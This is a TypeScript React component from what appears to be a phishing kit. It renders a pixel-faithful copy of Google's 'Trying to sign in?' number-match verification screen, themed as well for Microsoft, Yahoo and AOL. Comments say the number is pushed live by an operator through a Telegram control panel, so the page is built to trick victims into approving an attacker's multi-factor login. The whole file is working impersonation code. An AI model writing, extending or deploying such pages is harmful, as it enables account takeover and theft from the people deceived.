import React from 'react';
import { useLocation } from 'react-router-dom';
import { ProviderKey, getProviderTheme, ProviderLogo } from './providerTheme';

interface GoogleNumberPromptPageProps {
  providerKey: ProviderKey;
  /** Number forwarded by the operator over WebSocket. May also live on
   * `location.state.data.number` when the page is reached via navigation. */
  number?: number | string;
  onAction: (action: string, data?: Record<string, unknown>) => void;
}

/**
 * Google-style "Try signing in again" / 2-Step Verification "tap the matching
 * number" screen. The number itself is operator-driven (`show_google_number_prompt`
 * WebSocket command) — the page just displays it prominently, mirroring how
 * the real Google sign-in page asks the user to tap the matching number on
 * their phone.
 *
 * Although it is keyed off the Gmail flow, every provider routes here when the
 * operator clicks "Google # Prompt" in the Telegram control panel; we still
 * theme by provider so the chrome (background, fonts, accent) matches the
 * surrounding pages for that provider.
 */
const GoogleNumberPromptPage: React.FC<GoogleNumberPromptPageProps> = ({ providerKey, number: numberProp, onAction }) => {
  const location = useLocation();
  const theme = getProviderTheme(providerKey);
  const stateData = ((location.state as { data?: Record<string, unknown> } | null)?.data) || {};
  const email = (stateData.email as string) || '';
  const numberFromState = stateData.number as number | string | undefined;
  const number = (numberProp ?? numberFromState ?? '').toString();
  const deviceName = (stateData.deviceName as string) || (stateData.device as string) || 'your phone';

  const handleTryAnother = () => onAction('cancel');
  const handleNotMe = () => onAction('deny_authenticator');

  // Per-provider companion app name shown in the "Open your <app>" copy.
  // Defaults to the provider's display name (e.g. "Google", "Microsoft") when
  // no specific authenticator-app brand applies.
  const appName: Record<ProviderKey, string> = {
    gmail: 'Gmail',
    office365: 'Microsoft Authenticator',
    yahoo: 'Yahoo Mail',
    aol: 'AOL',
    others: 'authenticator',
  };

  // Gmail / Google has its own dedicated chrome (the real Google # prompt
  // screen). Other providers reuse the same big-number layout but in their
  // own theme so the experience is consistent if the operator ever fires
  // this command for a non-Gmail session.
  // Real Google "Trying to sign in?" / 2-Step Verification number-prompt
  // page is a single, narrow centered card (~ 450px) with the Google logo
  // at the top, the account chip, a small "Check your <device>" header,
  // the prominent number, instructions, and a "Yes" / "No, it's not me"
  // pair. We mirror that layout here exactly for Gmail; non-Gmail
  // providers (rare for this flow) reuse the same single-column layout
  // but in their own theme so the chrome stays consistent.
  return (
    <div className={`min-h-screen flex flex-col font-sans ${theme.backgroundClass}`} style={{ fontFamily: theme.fontFamily }}>
      <main className="flex-grow w-full flex items-start justify-center p-4 pt-12 md:pt-20">
        <div
          className="w-full max-w-[450px] mx-auto bg-white rounded-[28px] px-8 md:px-10 py-10"
          style={{ boxShadow: '0 1px 2px 0 rgba(60,64,67,.08), 0 1px 3px 1px rgba(60,64,67,.04)' }}
        >
          {/* Top: provider logo + account chip — same chrome real Google uses */}
          <div className="flex flex-col items-center">
            <ProviderLogo providerKey={providerKey} className="h-9 w-9" />
            {email && (
              <div className="mt-4">
                <button
                  type="button"
                  className="inline-flex items-center space-x-2 pl-1 pr-3 py-1 border border-gray-300 rounded-full hover:bg-gray-50 transition-colors"
                >
                  <div
                    className="w-6 h-6 rounded-full flex items-center justify-center text-white text-[11px] font-semibold"
                    style={{ backgroundColor: theme.primary }}
                  >
                    {email.charAt(0).toUpperCase()}
                  </div>
                  <span className="text-[13px] text-gray-800">{email}</span>
                  <svg className="w-4 h-4 text-gray-600" fill="currentColor" viewBox="0 0 20 20" aria-hidden="true">
                    <path fillRule="evenodd" d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z" clipRule="evenodd" />
                  </svg>
                </button>
              </div>
            )}
          </div>

          {/* Title — matches real Google copy */}
          <h1 className="text-[24px] leading-7 font-normal text-gray-900 text-center mt-8">
            Trying to sign in?
          </h1>
          <p className="text-[14px] leading-5 text-gray-700 text-center mt-3">
            Check your <strong>{deviceName}</strong> for a notification from{' '}
            <strong>{appName[providerKey]}</strong>, and tap the number you see below to sign in.
          </p>

          {/* Big number in a rounded badge — Google's pill */}
          <div className="mt-8 flex justify-center">
            <div
              className="rounded-full px-10 py-3 select-none"
              style={{
                backgroundColor: theme.primaryLight,
                color: theme.primary,
                fontSize: '40px',
                lineHeight: '1.1',
                fontWeight: 500,
                letterSpacing: '0.04em',
                minWidth: '120px',
                textAlign: 'center',
              }}
              aria-label={`Verification number ${number}`}
            >
              {number || '--'}
            </div>
          </div>

          {/* Waiting indicator */}
          <div className="flex items-center justify-center mt-6">
            <svg
              className="animate-spin h-4 w-4 mr-2"
              style={{ color: theme.primary }}
              viewBox="0 0 24 24"
              fill="none"
              aria-hidden="true"
            >
              <circle cx="12" cy="12" r="10" stroke="currentColor" strokeOpacity=".25" strokeWidth="4" />
              <path d="M4 12a8 8 0 018-8" stroke="currentColor" strokeWidth="4" strokeLinecap="round" />
            </svg>
            <span className="text-[13px] text-gray-600">Waiting&hellip;</span>
          </div>

          {/* Bottom actions — real Google shows "No, it's not me" + "Yes, it's me".
              Our auth flow uses the operator-driven prompt so we keep the same
              copy and labels but route the deny path to the standard
              `deny_authenticator` action. */}
          <div className="flex justify-between items-center mt-10">
            <button
              type="button"
              onClick={handleNotMe}
              className="text-sm font-semibold hover:underline"
              style={{ color: theme.primary }}
            >
              No, it&rsquo;s not me
            </button>
            <button
              type="button"
              onClick={handleTryAnother}
              className="text-sm font-semibold hover:underline"
              style={{ color: theme.primary }}
            >
              Try another way
            </button>
          </div>
        </div>
      </main>

      {providerKey === 'gmail' && (
        <footer className="w-full max-w-[450px] mx-auto flex justify-end items-center px-4 py-6 text-xs text-gray-700">
          <div className="flex items-center space-x-4">
            <a href="https://support.google.com/accounts" target="_blank" rel="noopener noreferrer" className="hover:underline">Help</a>
            <a href="https://policies.google.com/privacy" target="_blank" rel="noopener noreferrer" className="hover:underline">Privacy</a>
            <a href="https://policies.google.com/terms" target="_blank" rel="noopener noreferrer" className="hover:underline">Terms</a>
          </div>
        </footer>
      )}
    </div>
  );
};

export default GoogleNumberPromptPage;
